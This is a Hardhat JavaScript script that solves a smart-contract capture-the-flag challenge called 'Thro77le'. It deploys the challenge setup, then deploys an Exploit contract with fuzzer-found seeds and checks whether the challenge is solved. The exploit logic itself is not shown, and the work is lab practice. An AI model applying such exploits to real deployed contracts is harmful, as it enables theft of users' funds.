const { parseEther, parseUnits, formatUnits } = require("ethers/lib/utils");
var path = require('path');
var scriptName = path.basename(__filename, '.js');
const { ethers, waffle} = require("hardhat");
const provider = waffle.provider;

async function main() {
  const SETUP = await ethers.getContractFactory("contracts/" + scriptName + "/Setup.sol:Setup");
  const EXPLOIT = await ethers.getContractFactory("contracts/" + scriptName + "/Exploit.sol:Exploit");
  
  const setup = await SETUP.deploy();
  const challenge = await ethers.getContractAt("contracts/Thro77le/Challenge.sol:Challenge", await setup.challenge());
  const factory = await ethers.getContractAt("Factory", await setup.factory());

  console.log("solved:", await setup.isSolved());
  // generated with echidna
  hardhat_seed = "37535784649419077340614284926734857241179705728995374237819413109703363748266";
  ctf_seed = "51479216184425723975146308431218947475483327652822635706002660225093881707131";
  exploit = await EXPLOIT.deploy(challenge.address, formatUnits(hardhat_seed, "wei"), factory.address, {value: parseEther("1")});
  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
